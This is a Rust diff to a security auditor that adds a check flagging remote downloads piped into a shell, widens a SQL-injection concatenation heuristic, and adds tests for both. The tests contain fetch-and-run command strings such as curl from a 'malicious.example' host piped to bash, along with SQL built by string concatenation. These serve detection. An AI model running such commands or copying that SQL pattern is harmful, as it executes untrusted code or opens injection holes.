@@ -320,6 +320,43 @@ impl Auditor for ShellAuditor {
             }
         }
 
+        // ── 4. Pipe-to-shell detection ─────────────────────────────────
+        // The canonical `curl https://… | sh` malware-delivery pattern
+        // never matches the literal `"curl | sh"` substring above because
+        // the URL sits between the executable and the pipe. Walk pipe
+        // segments and flag any case where a remote-fetch command pipes
+        // into a shell interpreter — Warn rather than Block because the
+        // pattern is also used (less wisely) by legitimate installers.
+        const REMOTE_FETCHERS: &[&str] = &["curl", "wget", "fetch", "http", "https"];
+        const SHELL_INTERPRETERS: &[&str] =
+            &["sh", "bash", "zsh", "fish", "ksh", "dash", "ash"];
+
+        let pipe_segments: Vec<&str> = lowered.split('|').collect();
+        if pipe_segments.len() >= 2 {
+            let any_remote_fetch = pipe_segments
+                .iter()
+                .take(pipe_segments.len() - 1)
+                .any(|seg| {
+                    let executable = seg.split_whitespace().next().unwrap_or("");
+                    REMOTE_FETCHERS.contains(&executable)
+                });
+            if any_remote_fetch {
+                for segment in pipe_segments.iter().skip(1) {
+                    let executable = segment.split_whitespace().next().unwrap_or("");
+                    if SHELL_INTERPRETERS.contains(&executable) {
+                        findings.push(Finding::warn(
+                            "SH106",
+                            format!(
+                                "Pipe-to-shell pattern detected: remote download piped into \
+                                 `{executable}` — executes arbitrary remote code"
+                            ),
+                        ));
+                        break;
+                    }
+                }
+            }
+        }
+
         let verdict = findings
             .iter()
             .map(|f| f.severity)
@@ -420,8 +457,14 @@ impl Auditor for CodeAuditor {
             }
             // Heuristic: if the same line or a nearby line contains string
             // concatenation (`+`) or format!-style interpolation, flag it.
+            // We check both `+ "literal"` (variable on the left) and
+            // `"literal" +` (variable on the right) — the second form is
+            // what `"SELECT ... WHERE id = " + user_id` produces and was
+            // missed by the original heuristic.
             let has_concat = code.contains("+ \"")
                 || code.contains("+ '")
+                || code.contains("\" +")
+                || code.contains("' +")
                 || code.contains("format!(")
                 || code.contains("f\"")
                 || code.contains("f'")
@@ -653,6 +696,42 @@ mod tests {
         assert_eq!(report.verdict, Verdict::Warn);
     }
 
+    #[test]
+    fn shell_warns_remote_fetch_pipe_to_each_shell_variant() {
+        let auditor = ShellAuditor;
+        for command in [
+            "curl https://malicious.example/setup.sh | bash",
+            "wget -qO- https://example.com/install | sh",
+            "curl https://example.com | zsh",
+            "curl https://example.com | fish",
+            "wget https://example.com -O - | dash",
+        ] {
+            let report = auditor.audit_command(command);
+            assert_eq!(
+                report.verdict,
+                Verdict::Warn,
+                "expected `{command}` to warn, got {:?}",
+                report.verdict
+            );
+            assert!(
+                report.findings.iter().any(|f| f.rule_id == "SH106"),
+                "expected SH106 finding for `{command}`"
+            );
+        }
+    }
+
+    #[test]
+    fn shell_pipe_to_shell_without_remote_fetch_does_not_warn() {
+        // Piping local output into a shell isn't great practice but is not
+        // the curl-pipe-sh malware-delivery pattern. Don't false-positive.
+        let auditor = ShellAuditor;
+        let report = auditor.audit_command("cat install.sh | sh");
+        assert!(
+            !report.findings.iter().any(|f| f.rule_id == "SH106"),
+            "SH106 should only fire when an upstream pipe segment is a remote fetcher"
+        );
+    }
+
     // ── CodeAuditor ─────────────────────────────────────────────────────
 
     #[test]
@@ -662,6 +741,26 @@ mod tests {
         let report = auditor.audit_code(code);
         assert_eq!(report.verdict, Verdict::Warn);
         assert!(report.findings.iter().any(|f| f.rule_id == "CD001"));
+    }
+
+    #[test]
+    fn code_warns_sql_injection_concat_in_both_directions() {
+        // Cover the `var + "literal"` form too, not only the new
+        // `"literal" + var` form, to guard against regressions in the
+        // concatenation heuristic.
+        let auditor = CodeAuditor;
+        let lhs_concat = "query = user_id + \" AND name = 'a'\" + \"SELECT * FROM users\"";
+        let single_quote = "q = 'SELECT * FROM users WHERE id = ' + user_id";
+        for code in [lhs_concat, single_quote] {
+            let report = auditor.audit_code(code);
+            assert_eq!(
+                report.verdict,
+                Verdict::Warn,
+                "expected warn for `{code}`, got {:?}",
+                report.verdict
+            );
+            assert!(report.findings.iter().any(|f| f.rule_id == "CD001"));
+        }
     }
 
     #[test]
